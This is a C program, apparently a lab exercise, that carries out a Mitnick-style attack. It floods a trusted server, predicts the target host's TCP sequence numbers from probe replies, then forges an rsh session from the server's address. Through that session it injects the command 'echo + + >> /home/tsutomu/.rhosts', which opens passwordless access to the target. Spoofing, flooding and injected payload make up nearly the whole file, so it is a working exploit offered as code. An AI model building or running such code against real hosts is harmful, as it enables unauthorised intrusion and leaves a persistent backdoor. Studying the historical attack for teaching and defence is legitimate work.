#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <libnet.h>
#include <pcap.h>

#include <pthread.h>
#include <semaphore.h>

#include "packet.h"
#include "flood.h"
#include "sniff_types.h"
#include "sniff.h"

#define FILTER_EXPRESSION "src host 172.16.17.4 and not arp"

int MAXIMUM_PREDICTIONS = 1000;
int CONNECTION_SPOOFED = 0;

u_int32_t src_addr;
u_int16_t src_port;

uint32_t previous_seq = 0;
int32_t previous_diff = 0;
uint32_t predicted_seq = 0;

sem_t mutex;
int is_repeating = 0;

void handle_xterminal_response(u_char *user, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
    if (user || !pkthdr) {
        fprintf(stderr, "Invalid arguments passed to callback function.\n");
        return;
    }

    const struct ip_header *ip = (struct ip_header *) (packet + ETHERNET_HEADER_SIZE);
    u_int size_ip = IP_HEADER_LENGTH(ip) * 4;
    if (size_ip < 20) {
        fprintf(stderr, "Invalid IP header length.\n");
        return;
    }

    const struct tcp_header *tcp = (struct tcp_header *) (packet + ETHERNET_HEADER_SIZE + size_ip);
    u_int size_tcp = TH_OFF(tcp) * 4;
    if (size_tcp < 20) {
        fprintf(stderr, "Invalid TCP header length.\n");
        return;
    }

    uint32_t seq = ntohl(tcp->th_seq);
    int32_t difference = (int32_t) seq - previous_seq;
    
    if (predicted_seq == seq) {
        fprintf(
            stdout, 
            "Predicted and Actual sequence number matches [pred=%u][seq=%u]\n", 
            predicted_seq, seq
        );
    }

    sem_wait(&mutex);
    previous_seq = seq;
    if (previous_diff == difference) {
        ++is_repeating;
    } else {
        is_repeating = 0;
        previous_diff = difference;
    }
    sem_post(&mutex);
}

void *sniff() {
    sniff_open_session();

    sniff_add_filter(FILTER_EXPRESSION);

    sniff_start(MAXIMUM_PREDICTIONS, handle_xterminal_response);

    return NULL;
}

void spoof_connection(libnet_t *l, u_int32_t next_seq) {

    // Send SYN with server IP and random TCP ISN
    fprintf(stdout, "Sending spoofed SYN...\n");

    u_int32_t first_seq = libnet_get_prand(LIBNET_PRu32);
    send_packet_payload(
        l,
        first_seq, libnet_get_prand(LIBNET_PRu32), TH_SYN,
        get_xterminal_ip_addr(l), (u_int16_t) atoi(RSH_PORT),
        get_server_ip_addr(l), (u_int16_t) atoi(RLOGIN_PORT),
        NULL, 0
    );

    // Wait for SYN/ACK from xterminal to server
    // TCP ISN repeats in sequence of 5
    // We used 2 to discover it was a sequence
    // SYN/ACK is using 1 more. 2 left
    usleep(500000);

    fprintf(stdout, "Sending spoofed ACK...\n");

    send_packet_payload(
        l, first_seq + 1, next_seq + 1, TH_ACK,
        get_xterminal_ip_addr(l), (u_int16_t) atoi(RSH_PORT),
        get_server_ip_addr(l), (u_int16_t) atoi(RLOGIN_PORT),
        NULL, 0
    );
    usleep(100000);

    fprintf(stdout, "Sending \"+ +\" >> .rhosts...\n");
    first_seq++;
    char *payloads[4] = {"\0", "tsutomu\0", "tsutomu\0", "echo + + >> /home/tsutomu/.rhosts\0"};
    int i;
    for (i = 0; i < 4; ++i) {
        send_packet_payload(
            l, first_seq, next_seq + 1, TH_PUSH|TH_ACK,
            get_xterminal_ip_addr(l), (u_int16_t) atoi(RSH_PORT),
            get_server_ip_addr(l), (u_int16_t) atoi(RLOGIN_PORT),
            payloads[i], strlen(payloads[i]) + 1
        );

        first_seq += strlen(payloads[i]) + 1;
    }

    CONNECTION_SPOOFED = 1;
}

void start_prediction(libnet_t *l, int syn_count) {

    src_addr = get_ip_addr(l, MY_IP);

    fprintf(stdout, "Prepare to send %d SYN packets.\n", syn_count);

    int i;
    for (i = 0; i < syn_count && !CONNECTION_SPOOFED; ++i) {
        fprintf(stdout, "Prediction packet %d\n", i);

        sem_wait(&mutex);

        if (is_repeating == 2) {
            fprintf(stdout, "Sequence difference repeated!\n");
            // Once a difference between three consecutive sequence numbers repeats,
            // it repeats 3 more times.
            // So it means spoofing time!
            uint32_t next_seq = (uint32_t)previous_seq + previous_diff;
            predicted_seq = next_seq;

            fprintf(stdout, "Trying to spoof connection...\n");
            spoof_connection(l, next_seq);

            sem_post(&mutex);
            continue;
        }
        sem_post(&mutex);

        src_port = libnet_get_prand(LIBNET_PRu16);

        send_packet_payload(
            l,
            libnet_get_prand(LIBNET_PRu32), libnet_get_prand(LIBNET_PRu32), TH_SYN,
            get_xterminal_ip_addr(l), (u_int16_t) atoi(RSH_PORT),
            src_addr, src_port,
            NULL, 0
        );

        usleep(500000);
    }

    if (CONNECTION_SPOOFED) {
        fprintf(stdout, "Connection spoofed!\n");
    }
}

libnet_t *setup_libnet() {

    char errbuf[LIBNET_ERRBUF_SIZE];
    libnet_t *l = libnet_init(LIBNET_RAW4, NULL, errbuf);
    if (!l) {
        fprintf(stderr, "libnet_init error: %s\n", errbuf);
        exit(1);
    }

    libnet_seed_prand(l);

    return l;
}

int main() {

    pthread_t thread_sniffing;

    //mutex
    if (sem_init(&mutex, 0, 1) < 0) {
        fprintf(stderr, "Could not initialize the mutex.\n");
        exit(1);
    }

    // start the sniffing thread and wait for packages
    if (pthread_create(&thread_sniffing, NULL, sniff, NULL) < 0) {
        fprintf(stderr, "Could not create sniffing thread.\n");
        exit(1);
    }

    if (pthread_detach(thread_sniffing) < 0) {
        fprintf(stderr, "Could not detach sniffing thread.\n");
        exit(1);
    }

    libnet_t *libnet = setup_libnet();

    // Flood the server
    fprintf(stdout, "Flooding the server...\n");
    flood_server(libnet);
    fprintf(stdout, "Done!\n");

    // Begin attack:
    // Send syn requests as attacker
    //  - After a sequence of 1 repetitions
    //  - Send spoofed SYN packet
    //  - Server receives SYN|ACK from xterminal (no action)
    //  - Send spoofed ACK packet using predicted sequence number
    //  - Add + + in rhosts
    fprintf(stdout, "Predicting TCP ISN...\n");
    start_prediction(libnet, MAXIMUM_PREDICTIONS);

    // Reset the server
    fprintf(stdout, "Unflooding the server...\n");
    unflood_server(libnet);
    fprintf(stdout, "Done!\n");

    // Clean up
    sem_destroy(&mutex);
    libnet_clear_packet(libnet);
    libnet_destroy(libnet);

    return 0;
}
